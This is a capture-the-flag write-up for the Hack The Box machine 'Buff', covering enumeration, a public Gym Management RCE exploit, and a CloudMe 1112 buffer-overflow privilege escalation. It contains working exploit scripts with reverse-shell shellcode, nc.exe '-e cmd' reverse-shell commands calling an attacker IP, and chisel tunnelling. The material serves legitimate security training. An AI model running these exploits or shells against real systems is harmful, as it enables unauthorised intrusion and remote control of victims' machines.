---
title: Buff
draft: false
tags:
---
![[Pasted image 20250304203750.png]]

Machine: https://app.hackthebox.com/machines/263
# Enumeration
## Port Scanning
- using [[content/Tools/Nmap|Nmap]] for service and version scanning
```bash
nmap -p- -sSU -n -Pn --min-rate 5000 10.10.10.198 -oG allPorts
```
>[!example]- Result
>![[Pasted image 20250304203954.png]]

```bash
nmap -p7680,8080 -sVC -n -Pn --min-rate 5000 10.10.10.198 -oN Targeted
```
>[!example]- Result
>![[Pasted image 20250304204404.png]]

## Web site Enumeration
- Used tecnologies
```bash
whatweb http://10.10.10.198:8080
```
>[!example]- Result
>![[Pasted image 20250304204826.png]]

- we can sing in, but we dont have valid credentials
>[!example]- Result
>![[Pasted image 20250304205133.png]]

- Now we can try to preform a directory enumeration using [[gobuster]]
```bash
gobuster dir -u http://10.10.10.198:8080/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --add-slash
```

- we get this:
Information leakage `http://10.10.10.198:8080/profile/`, `http://10.10.10.198:8080/ex/`
>[!example]- Result
>![[Pasted image 20250304205623.png]]
>![[Pasted image 20250304210003.png]]

- After looking for more information, we found the version of the used software
>[!example]- Result
>![[Pasted image 20250304210850.png]]

# Exploitation
- looks like this software version have a RCE vulnerability [link](https://www.exploit-db.com/exploits/48506) (use python2)
```bash
searchsploit Gym Management
python 48506.py http://10.10.10.198:8080/
```
>[!example]- Result
>![[Pasted image 20250304222313.png]]
>![[Pasted image 20250304222540.png]]

- now we can upgrade own session
```bash
rlwrap -cAr nc -nlvp 4444
```
- and on the victim machine
```cmd
\\10.10.16.6\smbFolder\nc.exe -e cmd 10.10.16.6 4444
```

>[!example]- Result
>![[Pasted image 20250305111718.png]]
>![[Pasted image 20250305111747.png]]

# Privilege Escalation
## Enumerating
- Local opened ports
>[!example]- Result
>![[Pasted image 20250304232133.png]]

- I found a .php whoes porpose is connect to the MySQL data base
>[!example]- Result
>![[Pasted image 20250305112224.png]]
>![[Pasted image 20250305112801.png]]

- Get local users
```cmd
net users
```
>[!example]- Result
>![[Pasted image 20250304235549.png]]
- lets use [[winPEAS]] in order to get more info, and we have NTLMv2
>[!example]- Result
>![[Pasted image 20250305114508.png]]

- But we cant crack it, there are 2 opened ports and we have full access to this executable
>[!example]- Result
>![[Pasted image 20250305115731.png]]
>![[Pasted image 20250305120501.png]]

- so there is a service named CloudMe version 1112 and is running, so lets find more information, and we see that her default port is 8888 and this version is vulnerable
```bash
searchsploit CloudMe
```
>[!example]- Result
>![[Pasted image 20250305121102.png]]

## Buffer Overflow
- In order to attack this service we have to download the executable and move it to a windows machine (CloudMe banary is x32 bits)
>[!example]- Result
>![[Pasted image 20250305151320.png]]
>![[Pasted image 20250305151911.png]]
>![[Pasted image 20250305152032.png]]

- As the port is locally opened we need to get access using [[chisel]] (version 1.7.7).
Attacker
```bash
./chisel server --reverse -p 1234
```
Victim
```bash
chesel.exe client 192.168.1.45:1234 R:8888:127.0.0.1:8888
```

>[!example]- Result
>![[Pasted image 20250305171953.png]]

- now we can start with the BUF, frist we need to stablish a connection between the program and own script, using socket we are going to send 5000 'A' in order to check if the app crash
```python
#! /usr/bin/python3
import socket, signal, sys
def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables
ip_address = '127.0.0.1'
payload = b'A'*5000

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)

if __name__ == '__main__':
    makeConnection()
```

```bash
python exploit.py
```
>[!example]- Result
>![[Pasted image 20250305173352.png]]

- perfect the app crash so now lets to see how many 'A' is needed to crash the app, we can use a pattern using [[mona]] or [[Metasploit]] and use [[Immunity Debugger]]
>[!exampe]- Result
>![[Pasted image 20250305174421.png]]

```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 5000
```
>[!example]- Result
>![[Pasted image 20250305184454.png]]

- now we can send the string using the script
```python
#! /usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables
ip_address = '127.0.0.1'
payload = b'0Bx1Bx2Bx[snip]y4FGk4Gk5Gk'

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)

if __name__ == '__main__':
    makeConnection()
```

- now we now the length needed to override the EIP
>[!example]- Result
>![[Pasted image 20250305185648.png]]
```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 316a4230
```
>[!example]- Result
>![[Pasted image 20250305185951.png]]
`1052`

- now we can create a payload to make the ESP point to a custom address like that:
```python
#! /usr/bin/python3
import socket, signal, sys
def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)
# ctrl+c
signal.signal(signal.SIGINT, def_handler)
# Variables
ip_address = '127.0.0.1'
esp_offset = b'A'*1052
eip = b'B'*4
payload = esp_offset+eip
def makeConnection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)
if __name__ == '__main__':
    makeConnection()
```
>[!example]- Result
>![[Pasted image 20250305190559.png]]
>`BBBB`

- so now we can introduce the address of a OP code `jmp esp` in order to change the flow of the program, but first we need to know the interpretable characters using [[mona]]
```bash
!mona bytearray
```
>[!example]- Result
>![[Pasted image 20250305192145.png]]
>![[Pasted image 20250305192219.png]]

- now we have to send this string to the ESP registry
```python
#! /usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables
ip_address = '127.0.0.1'
esp_offset = b'A'*1052
eip = b'B'*4
after_eip = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = esp_offset+eip+after_eip

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)

if __name__ == '__main__':
    makeConnection()
```
>[!example]- Result
>![[Pasted image 20250305193034.png]]
>

- Perfect now we have to check what characters are not displayed, bad chars,  using [[mona]], and looks like we don't have bad chars
```bash
!mona compare -f .\bytearray.bin -a 0022D470
```
>[!info]- 0x0022F930 is the value of ESP
>![[Pasted image 20250305194342.png]]

- The next step is find the OP code, first we need the OP code we are looking for, using [[nasm_shell.rb]]
```bash
/opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
```
>[!example]- Result
>![[Pasted image 20250305201306.png]]
`\xFF\xE4`

- lets find this OP code using [[mona]], we have to find the one whoes flags are "False"
```bash
!mona modules
```
>[!example]- Result
>![[Pasted image 20250305201803.png]]
>![[Pasted image 20250305201959.png]]

- now lets check if this module have the needed OP code
```bash
!mona find -s "\xff\xe4" -m Qt5Core.dll
```
>[!Warning]- Use the ones who have "{PAGE_EXECUTE_READ}"
>all of those are valid ones
>![[Pasted image 20250305202407.png]]

- to be sure we can check it, at this point we can set a breakpoint (`F2`) in order to be sure
>[!example]- Result
>![[Pasted image 20250305202649.png]]
>![[Pasted image 20250305202707.png]]
>F2
>![[Pasted image 20250305202953.png]]

- As it is an address we have to flip it, from `0x68A98A7B` to `\x7B\x8A\xA9\x68`, so lets test it
```bash
#! /usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables
ip_address = '127.0.0.1'
esp_offset = b'A'*1052
eip = b'\x7B\x8A\xA9\x68'
after_eip = b'C'*300

payload = esp_offset+eip+after_eip

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)

if __name__ == '__main__':
    makeConnection()
```

>[!example]- Result
>![[Pasted image 20250305203915.png]]
>![[Pasted image 20250305203932.png]]

- Perfect now lets to create the shell code using [[msfvenom]] (in my case im going to remove the bad char `\x00` because use to give problems)
```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.45 LPORT=4443 -b "\x00" -f c
```
>[!example]- Result
>![[Pasted image 20250305204508.png]]

- So script look like this, (we use "nops" because we need to give time CPU in order to decode the shell code, because is encoded in x86/shikata_ga_nai by default)
```python
#! /usr/bin/python3

import socket, signal, sys

def def_handler(sig, frame):
    print('\n\n[!] Saliendo....\n')
    sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Variables
ip_address = '127.0.0.1'
esp_offset = b'A'*1052
eip = b'\x7B\x8A\xA9\x68'
after_eip = (b"\xba\xe9\x35\x34\x32\xdb\xdf\xd9\x74\x24\xf4\x5d\x31\xc9"
b"\xb1\x52\x83\xed\xfc\x31\x55\x0e\x03\xbc\x3b\xd6\xc7\xc2"
b"\xac\x94\x28\x3a\x2d\xf9\xa1\xdf\x1c\x39\xd5\x94\x0f\x89"
b"\x9d\xf8\xa3\x62\xf3\xe8\x30\x06\xdc\x1f\xf0\xad\x3a\x2e"
b"\x01\x9d\x7f\x31\x81\xdc\x53\x91\xb8\x2e\xa6\xd0\xfd\x53"
b"\x4b\x80\x56\x1f\xfe\x34\xd2\x55\xc3\xbf\xa8\x78\x43\x5c"
b"\x78\x7a\x62\xf3\xf2\x25\xa4\xf2\xd7\x5d\xed\xec\x34\x5b"
b"\xa7\x87\x8f\x17\x36\x41\xde\xd8\x95\xac\xee\x2a\xe7\xe9"
b"\xc9\xd4\x92\x03\x2a\x68\xa5\xd0\x50\xb6\x20\xc2\xf3\x3d"
b"\x92\x2e\x05\x91\x45\xa5\x09\x5e\x01\xe1\x0d\x61\xc6\x9a"
b"\x2a\xea\xe9\x4c\xbb\xa8\xcd\x48\xe7\x6b\x6f\xc9\x4d\xdd"
b"\x90\x09\x2e\x82\x34\x42\xc3\xd7\x44\x09\x8c\x14\x65\xb1"
b"\x4c\x33\xfe\xc2\x7e\x9c\x54\x4c\x33\x55\x73\x8b\x34\x4c"
b"\xc3\x03\xcb\x6f\x34\x0a\x08\x3b\x64\x24\xb9\x44\xef\xb4"
b"\x46\x91\xa0\xe4\xe8\x4a\x01\x54\x49\x3b\xe9\xbe\x46\x64"
b"\x09\xc1\x8c\x0d\xa0\x38\x47\xf2\x9d\x43\xba\x9a\xdf\x43"
b"\xd5\x01\x69\xa5\xbf\xa5\x3f\x7e\x28\x5f\x1a\xf4\xc9\xa0"
b"\xb0\x71\xc9\x2b\x37\x86\x84\xdb\x32\x94\x71\x2c\x09\xc6"
b"\xd4\x33\xa7\x6e\xba\xa6\x2c\x6e\xb5\xda\xfa\x39\x92\x2d"
b"\xf3\xaf\x0e\x17\xad\xcd\xd2\xc1\x96\x55\x09\x32\x18\x54"
b"\xdc\x0e\x3e\x46\x18\x8e\x7a\x32\xf4\xd9\xd4\xec\xb2\xb3"
b"\x96\x46\x6d\x6f\x71\x0e\xe8\x43\x42\x48\xf5\x89\x34\xb4"
b"\x44\x64\x01\xcb\x69\xe0\x85\xb4\x97\x90\x6a\x6f\x1c\xa0"
b"\x20\x2d\x35\x29\xed\xa4\x07\x34\x0e\x13\x4b\x41\x8d\x91"
b"\x34\xb6\x8d\xd0\x31\xf2\x09\x09\x48\x6b\xfc\x2d\xff\x8c"
b"\xd5")

NOPS = b"\x90"*32
payload = esp_offset+eip+NOPS+after_eip

def makeConnection():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, 8888))
    s.send(payload)

if __name__ == '__main__':
    makeConnection()
```

- we are listening, and run the script
```bash
nc -lvnp 4443
python exploit.py
```
>[!example]- Result
>![[Pasted image 20250305210134.png]]

- Perfect now we have to use this exploit in front of the victim machine IP (remember set the chisel port forwarding, and change the shell code revershell's IP)
>[!example]- Result
>![[Pasted image 20250305211053.png]]

